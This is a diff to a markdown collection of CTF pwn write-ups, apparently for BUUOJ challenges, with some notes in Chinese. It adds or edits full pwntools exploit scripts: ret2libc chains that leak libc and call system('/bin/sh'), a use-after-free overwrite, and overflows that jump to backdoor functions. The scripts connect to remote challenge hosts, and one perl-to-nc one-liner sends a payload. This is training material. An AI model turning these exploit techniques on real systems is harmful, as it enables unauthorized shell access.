@@ -22,6 +22,8 @@ categories:
   - x86_64 with `rax` filled with system call number 
     - user call: `rdi, rsi, rdx, rcx, r8, r9`
     - system call: `rdi, rsi, rdx, r10, r8, r9`
+- [**Format string vulnerability**](https://wooyun.js.org/drops/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B.html)
+- UAF: use-after-free vulnerability
 
 ## Problems
 
@@ -84,7 +86,7 @@ base_libc = puts_libc - searcher.dump('puts')
 log.info(f"libc: base={hex(base_libc)}")
 
 system_libc = base_libc + searcher.dump('system')
-binsh_libc = base_libc + searcher.dump('bin_sh_addr')
+binsh_libc = base_libc + searcher.dump('str_bin_sh')
 log.info(f'libc: system={hex(system_libc)}; /bin/sh={hex(binsh_libc)}')
 
 proc.send(payload_length)
@@ -127,7 +129,7 @@ proc.sendline(payload)
 log.info(proc.recvall())
 ```
 #### [第五空间2019 决赛]PWN5
-[**Format string exploit**](https://wooyun.js.org/drops/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B.html)
+Flaw: format string vulnerability
 
 ```python
 #!/usr/bin/python3.6
@@ -385,7 +387,7 @@ log.info(f'puts={hex(c_func_addr)}')
 searcher = LibcSearcher(func='puts', address=c_func_addr)
 base_addr = c_func_addr - searcher.dump('puts')
 system_addr = base_addr + searcher.dump('system')
-bin_sh_addr = base_addr + searcher.dump('bin_sh_addr')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
 
 log.info(f'base={hex(base_addr)}; system={hex(system_addr)}; /bin/sh={hex(bin_sh_addr)}')
 
@@ -506,7 +508,7 @@ searcher = LibcSearcher()
 searcher.add_condition('read', read_addr)
 base_addr = read_addr - searcher.dump('read')
 system_addr = searcher.dump('system') + base_addr
-bin_sh_addr = searcher.dump('bin_sh_addr') + base_addr
+bin_sh_addr = searcher.dump('str_bin_sh') + base_addr
 log.success(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
 
 payload = b'2' * ra_offset + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
@@ -559,7 +561,7 @@ searcher = LibcSearcher()
 searcher.add_condition('printf', print_addr)
 base_addr = print_addr - searcher.dump('printf')
 system_addr = base_addr + searcher.dump('system')
-bin_sh_addr = base_addr + searcher.dump('bin_sh_addr')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
 log.success(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={bin_sh_addr}')
 
 p.sendline(b'-1')
@@ -597,7 +599,7 @@ searcher = LibcSearcher()
 searcher.add_condition('__libc_start_main', start_addr)
 base_addr = start_addr - searcher.dump('__libc_start_main')
 system_addr = base_addr + searcher.dump('system')
-bin_sh_addr = base_addr + searcher.dump('bin_sh_addr')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
 
 log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
 payload = b'2' * ra_offset + p32(system_addr) + p32(vuln) + p32(bin_sh_addr)
@@ -640,7 +642,7 @@ searcher = LibcSearcher()
 searcher.add_condition('__libc_start_main', start_addr)
 base_addr = start_addr - searcher.dump('__libc_start_main')
 system_addr = base_addr + searcher.dump('system')
-bin_sh_addr = base_addr + searcher.dump('bin_sh_addr')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
 
 log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
 payload = b'2' * ra_offset + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)
@@ -689,7 +691,7 @@ searcher = LibcSearcher()
 searcher.add_condition('__libc_start_main', c_func_addr)
 base_addr = c_func_addr - searcher.dump('__libc_start_main')
 system_addr = base_addr + searcher.dump('system')
-bin_sh_addr = base_addr + searcher.dump('bin_sh_addr')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
 
 log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
 payload = pivot + b'a'*ra_offset + p32(system_addr) + p32(chall) + p32(bin_sh_addr)
@@ -787,7 +789,7 @@ searcher = LibcSearcher()
 searcher.add_condition('__libc_start_main', c_func_addr)
 base_addr = c_func_addr - searcher.dump('__libc_start_main')
 system_addr = base_addr + searcher.dump('system')
-bin_sh_addr = base_addr + searcher.dump('bin_sh_addr')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
 log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
 
 Auth()
@@ -880,7 +882,7 @@ log.success(f'__libc_start_main={hex(c_func_addr)}')
 searcher = LibcSearcher(func='__libc_start_main', address=c_func_addr)
 base_addr = c_func_addr - searcher.dump('__libc_start_main')
 system_addr = base_addr + searcher.dump('system')
-bin_sh_addr = base_addr + searcher.dump('bin_sh_addr')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
 log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
 
 
@@ -917,7 +919,7 @@ searcher = LibcSearcher()
 searcher.add_condition('__libc_start_main', c_func_addr)
 base_addr = c_func_addr - searcher.dump('__libc_start_main')
 system_addr = base_addr + searcher.dump('system')
-bin_sh_addr = base_addr + searcher.dump('bin_sh_addr')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
 log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
  
 p.sendlineafter(b'Input:\n', b'1'*(ebp_offset + 4) + p32(system_addr) + p32(ret_function) + p32(bin_sh_addr))
@@ -991,9 +993,125 @@ payload += p32(0x804a02c)
 log.info(f'len={hex(len(payload))}')
 # input()
 p.sendline(payload)
-# content = p.recvuntil(b'\x2c')
-# content = content[:-1]
-# log.success(f'len={hex(len(content))}, byte={hex(len(content) % 256)}, content={content}')
-# print(content.decode())
+p.interactive()
+```
+
+### ydsneedgirlfriend2
+
+Flaw: UAF
+
+```python
+#!/usr/bin/python3.6
+import re
+from pwn import *
+
+filename = './ydsneedgirlfriend2'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 29074)
+
+backdoor = e.sym['backdoor']
+
+# 第一次申请的大小没关系
+p.sendlineafter(b'u choice :\n', b'1')
+p.sendlineafter(b'Please input the length of her name:\n', b'25')
+p.sendlineafter(b'Please tell me her name:\n', b'maki')
+
+# 此时先后释放掉一个字符数组以及结构体，其中：
+# 1. 结构体指针数组没有置为空；因为程序的逻辑，第二次申请的时候不会为结构体申请内存
+# 2. 结构体的长度为16；第二次申请长度为16的字符数组，就会申请到这个结构体的内存
+p.sendlineafter(b'u choice :\n', b'2')
+p.sendlineafter(b'Index :', b'0')
+
+# 第二次一定要申请16字节
+p.sendlineafter(b'u choice :\n', b'1')
+p.sendlineafter(b'Please input the length of her name:\n', b'16')
+p.sendlineafter(b'Please tell me her name:\n', p64(0xdeadbeef) + p64(backdoor))
+
+p.sendlineafter(b'u choice :\n', b'3')
+p.sendlineafter(b'Index :', b'0')
+p.interactive()
+```
+
+### guestbook
+
+不知道为啥perl命令没有输出。。。`perl -e 'print "0"x0x88 . "\x20\x06\x40\x00\x00\x00\x00\x00\n"' | nc node3.buuoj.cn 28935` 抓包没发现有什么不同的地方，猜想可能是因为perl结束的太快了：在perl输出结束之后管道就关闭了，打出EOF，在远程返回之前就结束了。
+
+
+```python
+#!/usr/bin/python3.6
+import re
+from pwn import *
+
+filename = './guestbook'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 28935)
+
+backdoor = e.sym['good_game']
+p.sendlineafter(b'message:\n', b'0' * 0x88 + p64(backdoor))
+content = p.recvall()
+content = content.split(b'\n', 1)[1]
+log.success(content)
+```
+
+### jarvisoj_level4
+
+```python
+#!/usr/bin/python3.6
+import re
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+filename = './jarvisoj_level4'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 25276)
+
+
+log.level = 'DEBUG'
+for k, v in e.got.items():
+    log.debug(f'got:{k}={hex(v)}')
+
+ret_function = e.sym['main']
+write_plt, c_func_got = e.plt['write'], e.got['__libc_start_main']
+log.info(f'write:plt={hex(write_plt)}, __libc_start_main:got={hex(c_func_got)}')
+
+ebp_offset = 0x88
+p.sendline(b'0'*(ebp_offset+4) + p32(write_plt) + p32(ret_function) + p32(1) + p32(c_func_got) + p32(4))
+c_func_addr = u32(p.recv(4))
+log.success(f'__libc_start_main={hex(c_func_addr)}')
+
+searcher = LibcSearcher()
+searcher.add_condition('__libc_start_main', c_func_addr)
+base_addr = c_func_addr - searcher.dump('__libc_start_main')
+system_addr = base_addr + searcher.dump('system')
+bin_sh_addr = base_addr + searcher.dump('str_bin_sh')
+log.info(f'base={hex(base_addr)}, system={hex(system_addr)}, /bin/sh={hex(bin_sh_addr)}')
+ 
+p.sendline(b'1'*(ebp_offset + 4) + p32(system_addr) + p32(ret_function) + p32(bin_sh_addr))
+p.interactive()
+```
+
+### bjdctf_2020_babystack2
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './bjdctf_2020_babystack2'
+e = ELF(filename)
+# p = process(filename)
+p = remote("node3.buuoj.cn", 28865)
+
+log.level = 'DEBUG'
+for k, v in e.got.items():
+    log.debug(f'got:{k}={hex(v)}')
+
+backdoor = e.sym['backdoor']
+log.info(f'backdoor={hex(backdoor)}')
+
+p.sendline(b'-1')
+p.sendline(b'0'*(0x10+8) + p64(backdoor))
 p.interactive()
 ```
